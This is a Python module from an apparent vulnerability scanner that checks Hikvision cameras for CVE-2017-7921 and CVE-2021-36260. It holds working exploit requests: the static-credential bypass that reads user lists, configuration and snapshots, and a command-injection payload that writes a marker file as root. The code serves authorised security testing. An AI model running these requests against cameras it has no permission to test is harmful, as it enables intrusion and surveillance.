"""Hikvision-family checks (also covers HiWatch, HiLook and the many ISAPI rebadges)."""

from __future__ import annotations

import re
import secrets

from ..core.models import Confidence, Finding, Severity
from .base import CheckContext, port_of, register

#: the static base64 blob the CVE-2017-7921 handler accepts as an authenticated identity
_MAGIC_AUTH = "YWRtaW46MTEK"

_BYPASS_PATHS = (
    "/System/configurationFile?auth=" + _MAGIC_AUTH,
    "/Security/users?auth=" + _MAGIC_AUTH,
    "/System/deviceInfo?auth=" + _MAGIC_AUTH,
    "/onvif-http/snapshot?auth=" + _MAGIC_AUTH,
)


@register("hikvision_auth_bypass", "CVE-2017-7921 improper authentication / config disclosure")
async def hikvision_auth_bypass(ctx: CheckContext) -> list[Finding]:
    """Confirm the static-credential authentication bypass by reading a privileged endpoint."""
    out: list[Finding] = []
    for base in ctx.bases():
        for path in _BYPASS_PATHS:
            resp = await ctx.probe.get(base + path)
            if resp is None or resp.status_code != 200:
                continue
            body = resp.text[:4000]
            proof = _bypass_proof(path, body, resp.headers.get("content-type", ""))
            if not proof:
                continue
            await _enrich_device_info(ctx, base)
            out.append(
                ctx.finding(
                    severity=Severity.CRITICAL,
                    confidence=Confidence.CONFIRMED,
                    evidence=proof,
                    matched_at=base + path,
                    port=port_of(base),
                    tags=["auth-bypass", "info-leak", "hikvision"],
                    extra={"users": _usernames(body)} if "<userName>" in body else {},
                )
            )
            return out                     # one confirmed path is proof enough
    return out


async def _enrich_device_info(ctx: CheckContext, base: str) -> None:
    """Pull model / firmware / serial through the bypass so the report identifies the unit."""
    resp = await ctx.probe.get(base + "/System/deviceInfo?auth=" + _MAGIC_AUTH)
    if resp is None or resp.status_code != 200:
        return
    body = resp.text
    ctx.device.model = ctx.device.model or _tag(body, "model")
    ctx.device.firmware = ctx.device.firmware or _tag(body, "firmwareVersion")
    ctx.device.serial = ctx.device.serial or _tag(body, "serialNumber")


def _bypass_proof(path: str, body: str, content_type: str) -> str:
    if "/Security/users" in path and "<userName>" in body:
        users = _usernames(body)
        return f"unauthenticated user database read; accounts: {', '.join(users) or 'parsed none'}"
    if "configurationFile" in path and len(body) > 200:
        return f"unauthenticated configuration download, {len(body)} bytes returned"
    if "deviceInfo" in path and "<deviceName>" in body:
        model = _tag(body, "model")
        fw = _tag(body, "firmwareVersion")
        return f"unauthenticated device info read (model={model or '?'}, firmware={fw or '?'})"
    if "snapshot" in path and content_type.startswith("image/"):
        return "unauthenticated live snapshot retrieved via the auth-bypass parameter"
    return ""


def _usernames(body: str) -> list[str]:
    return re.findall(r"<userName>([^<]+)</userName>", body)[:20]


def _tag(body: str, name: str) -> str:
    m = re.search(rf"<{name}>([^<]+)</{name}>", body, re.I)
    return m.group(1).strip() if m else ""


@register("hikvision_isapi_info", "ISAPI device information exposure")
async def hikvision_isapi_info(ctx: CheckContext) -> list[Finding]:
    """Read model / firmware / serial from the ISAPI tree and enrich the device record."""
    out: list[Finding] = []
    for base in ctx.bases():
        resp = await ctx.probe.get(base + "/ISAPI/System/deviceInfo")
        if resp is None or resp.status_code != 200 or "<deviceName>" not in resp.text:
            continue
        body = resp.text
        model, fw, serial = _tag(body, "model"), _tag(body, "firmwareVersion"), _tag(body, "serialNumber")
        ctx.device.model = ctx.device.model or model
        ctx.device.firmware = ctx.device.firmware or fw
        ctx.device.serial = ctx.device.serial or serial
        out.append(
            ctx.finding(
                severity=Severity.INFO,
                confidence=Confidence.CONFIRMED,
                evidence=f"model={model} firmware={fw} serial={serial}",
                matched_at=base + "/ISAPI/System/deviceInfo",
                port=port_of(base),
                tags=["info-leak", "hikvision"],
            )
        )
        break
    return out


@register("hikvision_cve_2021_36260", "CVE-2021-36260 unauthenticated command injection")
async def hikvision_cve_2021_36260(ctx: CheckContext) -> list[Finding]:
    """Test the web language SDK endpoint for the unauthenticated injection.

    Without ``--exploit`` this reports reachability of the vulnerable endpoint plus the
    firmware fingerprint, which is enough to flag the device for patching. With
    ``--exploit`` it proves execution by writing a uniquely named marker into the web
    root and reading it back. The marker path is reported so the operator can remove it;
    nothing else on the device is touched.
    """
    out: list[Finding] = []
    for base in ctx.bases():
        head = await ctx.probe.request("PUT", base + "/SDK/webLanguage", content=b"")
        if head is None:
            continue
        # a patched or non-Hikvision server answers 404; the vulnerable handler parses the body
        if head.status_code in (404, 403):
            continue

        if not ctx.allow_intrusive:
            out.append(
                ctx.finding(
                    severity=Severity.HIGH,
                    confidence=Confidence.POSSIBLE,
                    evidence=(
                        f"PUT /SDK/webLanguage answered {head.status_code}; the injection sink is "
                        "reachable. Verification requires command execution, so re-run with "
                        "--exploit to confirm, or treat as unpatched."
                    ),
                    matched_at=base + "/SDK/webLanguage",
                    port=port_of(base),
                    tags=["rce", "command-injection", "hikvision", "unverified"],
                )
            )
            continue

        marker = f"kamstrike_{secrets.token_hex(6)}"
        payload = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            f"<language>$(echo {marker} > webLib/{marker}.txt)</language>"
        )
        resp = await ctx.probe.request(
            "PUT", base + "/SDK/webLanguage", content=payload.encode(),
            headers={"Content-Type": "application/xml"},
        )
        if resp is None:
            continue
        check = await ctx.probe.get(f"{base}/{marker}.txt")
        if check is not None and check.status_code == 200 and marker in check.text:
            out.append(
                ctx.finding(
                    severity=Severity.CRITICAL,
                    confidence=Confidence.CONFIRMED,
                    evidence=(
                        f"injected command executed as root; marker file /{marker}.txt was created "
                        f"and read back. DELETE THIS FILE from the device web root after testing."
                    ),
                    matched_at=base + "/SDK/webLanguage",
                    port=port_of(base),
                    tags=["rce", "command-injection", "hikvision", "intrusive"],
                    extra={"artifact_to_clean_up": f"webLib/{marker}.txt"},
                )
            )
            return out
        out.append(
            ctx.finding(
                severity=Severity.MEDIUM,
                confidence=Confidence.POSSIBLE,
                evidence=(
                    f"PUT /SDK/webLanguage accepted the injection body ({resp.status_code}) but the "
                    "marker could not be read back; the device may be patched, or the web root "
                    "differs on this firmware."
                ),
                matched_at=base + "/SDK/webLanguage",
                port=port_of(base),
                tags=["rce", "command-injection", "hikvision", "unverified"],
            )
        )
    return out
